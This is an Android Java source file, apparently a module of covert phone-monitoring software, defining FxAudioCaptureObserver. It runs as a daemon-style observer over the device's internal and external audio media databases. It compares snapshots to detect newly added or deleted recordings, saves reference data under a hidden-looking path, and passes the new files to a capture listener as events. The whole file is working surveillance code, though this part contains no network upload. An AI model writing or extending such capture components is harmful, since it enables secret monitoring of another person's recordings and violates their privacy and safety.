package com.vvt.capture.audio;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import android.net.Uri;
import android.provider.MediaStore.Audio;
import android.util.Log;

import com.vvt.base.FxEvent;
import com.vvt.calendar.CalendarObserver;
import com.vvt.contentobserver.IDaemonContentObserver;
import com.vvt.ioutil.SDCard;
import com.vvt.logger.FxLog;
import com.vvt.stringutil.FxStringUtils;

public class FxAudioCaptureObserver extends IDaemonContentObserver {

	private static final String TAG = "FxAudioCaptureObserver";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;

	private static final String DEFAULT_DATE_FORMAT = "dd/MM/yy HH:mm:ss";
	private static final String DEFAULT_PATH = "/sdcard/data/data/com.vvt.im";
		
	private CalendarObserver mCalendarObserver;
	private OnCaptureListener mListener;
	@SuppressWarnings("unused")
	private SimpleDateFormat mDateFormatter;
	private String mLoggablePath;
	private HashMap<Long, String> mlatestExternalLocationMap;  
	private HashMap<Long, String> mlatestInternalLocationMap;
	private Timer mTimer = null;
	private static final int SLEEP_TIME_SINCE_LAST_NOTIFICATION_IN_SEC = 10; //60000;
	
	private static FxAudioCaptureObserver sInstance;
	
	public static FxAudioCaptureObserver getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new FxAudioCaptureObserver(context);
		}
		return sInstance;
	}
	
	private FxAudioCaptureObserver(Context context) {
		super(context);
		
		mCalendarObserver = CalendarObserver.getInstance();
		mCalendarObserver.enable();
		
		mDateFormatter = new SimpleDateFormat(DEFAULT_DATE_FORMAT);
		mLoggablePath = DEFAULT_PATH;
		
		mlatestExternalLocationMap = new HashMap<Long, String>();
		mlatestInternalLocationMap = new HashMap<Long, String>();
	}
	
	public void setLoggablePath(String path) {
		if(LOGV) FxLog.d(TAG, "setLoggablePath # START");
		mLoggablePath = path;
		
		if(LOGD) FxLog.d(TAG, "setLoggablePath # mLoggablePath :" + mLoggablePath);
		if(LOGV) FxLog.d(TAG, "setLoggablePath # EXIT");
	}
	
	public void setDateFormat(String format) {
		mDateFormatter = new SimpleDateFormat(format);
	}
	
	public void registerObserver(OnCaptureListener listener) {
		if(LOGV) FxLog.d(TAG, "registerObserver # START");
		
		final String externalDatabaseFilePath = FxAudioHelper.getExternalDatabaseFilePath();
		
		if(!FxStringUtils.isEmptyOrNull(externalDatabaseFilePath)) {
			if(LOGD) FxLog.d(TAG, "registerObserver # externalDatabaseFilePath :" + externalDatabaseFilePath);
		
			final HashMap<Long, String> externalAudioMap = FxAudioHelper.getAllAudios(externalDatabaseFilePath);
			if(LOGD) FxLog.d(TAG, String.format("registerObserver # externalAudioMap size : %d", externalAudioMap.size()));
			setRefExternalAudioMap(externalAudioMap);
		}
		else {
			if(LOGE) FxLog.e(TAG, "registerObserver # externalDatabaseFilePath null ");
		}
		
		final String internalDatabaseFilePath = FxAudioHelper.getInternalDatabaseFilePath();
		
		if(!FxStringUtils.isEmptyOrNull(internalDatabaseFilePath)) {
			if(LOGD) FxLog.d(TAG, "registerObserver # internalDatabaseFilePath:" + internalDatabaseFilePath);
			
			final HashMap<Long, String> internalAudioMap = FxAudioHelper.getAllAudios(internalDatabaseFilePath);
			if(LOGD) FxLog.d(TAG, String.format("registerObserver # internalAudioMap size : %d", internalAudioMap.size()));
			setRefInternalAudioMap(internalAudioMap);
		}
		else {
			if(LOGE) FxLog.e(TAG, "registerObserver # internalDatabaseFilePath is null");
		}
		
		mListener = listener;
		super.registerObserver();
		if(LOGV) FxLog.v(TAG, "registerObserver # EXIT");
	}
	
	
	private void setRefExternalAudioMap(HashMap<Long, String> map) {
		if(LOGV) FxLog.v(TAG, "setRefExternalAudioMap # START");
		if(LOGV) FxLog.d(TAG, "setRefExternalAudioMap # map size:" + map.size());
		
		mlatestExternalLocationMap = map;
		FxAudioSettings.setRefExternalAudioMap(mLoggablePath, map);
		
		if(LOGV) FxLog.d(TAG, "setRefExternalAudioMap # EXIT");
	}
	
	private void setRefInternalAudioMap(HashMap<Long, String> map) {
		if(LOGV) FxLog.v(TAG, "setRefInternalAudioMap # START");
		if(LOGD) FxLog.d(TAG, "setRefInternalAudioMap # map size:" + map.size());
		
		mlatestInternalLocationMap = map;
		FxAudioSettings.setRefInternalAudioMap(mLoggablePath, map);
		
		if(LOGV) FxLog.v(TAG, "setRefInternalAudioMap # EXIT");
	}
	
	public void unregisterObserver(OnCaptureListener listener) {
		if(LOGV) FxLog.v(TAG, "unregisterObserver # START");
		
		mListener = null;
		super.unregisterObserver();
		
		if(LOGV) FxLog.v(TAG, "unregisterObserver # STOP");
	}
	
	@Override
	protected void onContentChange() {
		if(LOGV) FxLog.d(TAG, "onContentChange # ENTER ...");
		
		if(mTimer != null) {
			mTimer.cancel();
			if(LOGD) Log.d(TAG, "count down timer resetting...");
		}	
		
		mTimer = new Timer();
		mTimer.scheduleAtFixedRate(new TimerTask() {
            int i = SLEEP_TIME_SINCE_LAST_NOTIFICATION_IN_SEC;
            public void run() {
            	if(LOGV) Log.v(TAG, "Comparison will start in:" + i--);
                if (i< 0) {
                	mTimer.cancel();
                	
                	notifyChange();
                }
            }
        }, 0, 1000);
		
		if(LOGV) FxLog.v(TAG, "onContentChange # EXIT ...");
	}
	
	private void notifyChange() {
		if(LOGV) FxLog.v(TAG, "notifyChange # START ...");
		processInternal();
		processExternal();
		if(LOGV) FxLog.v(TAG, "notifyChange # EXIT ...");
	}

	private void processInternal() {
		if(LOGV) FxLog.v(TAG, "processInternal # ENTER ...");
		
		ArrayList<FxEvent> events = new ArrayList<FxEvent>();
		
		try {
			final String internalDatabaseFilePath = FxAudioHelper.getInternalDatabaseFilePath() ;
			
			if(!FxStringUtils.isEmptyOrNull(internalDatabaseFilePath)) {
				final HashMap<Long, String> currentAudioMapOfInternal = FxAudioHelper.getAllAudios(internalDatabaseFilePath);

				if(LOGD) FxLog.d(TAG, "processInternal # internalDatabaseFilePath :" + internalDatabaseFilePath);
				if(LOGD) FxLog.d(TAG, "processInternal # currentAudioMapOfInternal size:" + currentAudioMapOfInternal.size());
				
				if(currentAudioMapOfInternal.size() == mlatestInternalLocationMap.size()) {
					// Row count is same. nothing changed. escape ..
					if(LOGD) FxLog.d(TAG, "processInternal # Row count is same. nothing changed. escape ..");
					return;
				}
				else if(currentAudioMapOfInternal.size() > mlatestInternalLocationMap.size()) {
					if(LOGD) FxLog.d(TAG, "processInternal #New Audio has added ..");
					
					// New Audio has added ..
					events = FxAudioHelper.getWhatsNew(mLoggablePath, internalDatabaseFilePath, mlatestInternalLocationMap, currentAudioMapOfInternal);
					if(LOGD) FxLog.d(TAG, "processInternal # events size:" + events.size());
					
					// Reset the current map
					setRefInternalAudioMap(currentAudioMapOfInternal);

					if(events != null && events.size() > 0) {
						if (mListener != null) {
							mListener.onCapture(events);
						}
					}
				}
				else {

					// Check whether SDCars is available. If the SD Card is not available it will return 0 size collection.
					if(!SDCard.isConnected()) {
						if(LOGD) FxLog.d(TAG, "processInternal # SD Card is not connected..");
						return;
					}

					if(LOGD) FxLog.d(TAG, "processInternal # Audio has been deleted.");
					// Audio has been deleted.
					events = FxAudioHelper.getWhatsDeleted(mlatestInternalLocationMap, currentAudioMapOfInternal);

					if(LOGD) FxLog.d(TAG, "processInternal # events size:" + events.size());
					
					// Reset the current map
					setRefInternalAudioMap(currentAudioMapOfInternal);

					if(events != null && events.size() > 0)
						mListener.onCapture(events);
				}
		
			}
		}
		catch (Throwable t) {
			if(LOGE)  FxLog.e(TAG, t.toString());
		}
		
		if(LOGV) FxLog.v(TAG, "processInternal # ENTER ...");
	}
	
	private void processExternal() {
		if(LOGV) FxLog.v(TAG, "processExternal # ENTER ...");
		
		try {
			final String externalDatabaseFilePath = FxAudioHelper.getExternalDatabaseFilePath();
			
			if(!FxStringUtils.isEmptyOrNull(externalDatabaseFilePath)) {
				final HashMap<Long, String> currentAudioMapOfExternal = FxAudioHelper.getAllAudios(externalDatabaseFilePath);
				ArrayList<FxEvent> events = new ArrayList<FxEvent>();
				
				if(LOGD) FxLog.d(TAG, "processExternal # externalDatabaseFilePath  :" + externalDatabaseFilePath);
				if(LOGD) FxLog.d(TAG, String.format("processExternal # currentAudioMapOfExternal Size: %d vs  mlatestExternalLocationMap Size: %d", currentAudioMapOfExternal.size(), mlatestExternalLocationMap.size()));
				
				if(currentAudioMapOfExternal.size() == mlatestExternalLocationMap.size()) {
					// Row count is same. nothing changed. escape ..
					if(LOGD) FxLog.d(TAG, "processExternal # Row count is same. nothing changed. escape ..");
					return;
				}
				else if(currentAudioMapOfExternal.size() > mlatestExternalLocationMap.size()) {
					// New Audio has added ..
					if(LOGD) FxLog.d(TAG, "processExternal # New Audio has added ..");
					
					events = FxAudioHelper.getWhatsNew(mLoggablePath, externalDatabaseFilePath, mlatestExternalLocationMap, currentAudioMapOfExternal);
					if(LOGD) FxLog.d(TAG, "processExternal # events size:" + events.size());
					
					// Reset the current map
					setRefExternalAudioMap(currentAudioMapOfExternal);

					if(events != null && events.size() > 0) {
						if (mListener != null) {
							mListener.onCapture(events);
						}
					}
				}
				else {

					// Check whether SDCars is available. If the SD Card is not available it will return 0 size collection.
					if(!SDCard.isConnected()) {
						if(LOGD) FxLog.d(TAG, "processExternal # SD Card is not conneced, bailing");
						return;
					}

					// Audio has been deleted.
					events = FxAudioHelper.getWhatsDeleted(mlatestExternalLocationMap, currentAudioMapOfExternal);

					// Reset the current map
					setRefExternalAudioMap(currentAudioMapOfExternal);

					if(events != null && events.size() > 0)
						mListener.onCapture(events);
				}
			}
		}
		catch (Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());
		}
		
		if(LOGV) FxLog.v(TAG, "processExternal # EXIT ...");
	}
	
	@Override
	protected Uri getContentUri() {
		if(LOGV) FxLog.v(TAG, "getContentUri # ENTER ...");
		Uri mediaUri = Audio.Media.EXTERNAL_CONTENT_URI;
		if(LOGV) FxLog.v(TAG, "getContentUri # Uri:" + mediaUri.toString());
		if(LOGV) FxLog.v(TAG, "getContentUri # EXIT ...");
		return mediaUri;
	}

	@Override
	protected String getTag() {
		return TAG;
	}

	public static interface OnCaptureListener {
		public void onCapture(ArrayList<FxEvent> Audios);
	}
}
